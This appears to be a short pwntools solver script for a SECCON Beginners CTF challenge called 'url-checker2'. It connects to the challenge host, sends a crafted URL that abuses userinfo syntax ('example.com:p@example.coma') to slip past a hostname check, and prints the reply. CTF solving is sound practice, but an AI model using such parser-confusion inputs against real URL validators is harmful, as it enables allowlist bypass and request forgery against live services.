from pwn import *

# p: tube = process("docker run -i s4b25-petname:latest /home/pwn/chall", shell=True)
p: tube = remote("url-checker2.challenges.beginners.seccon.jp", 33458)

p.sendline(b" https://example.com:p@example.coma/")

s = p.recvall(timeout=5)
print(s.decode("utf-8", errors="ignore"))
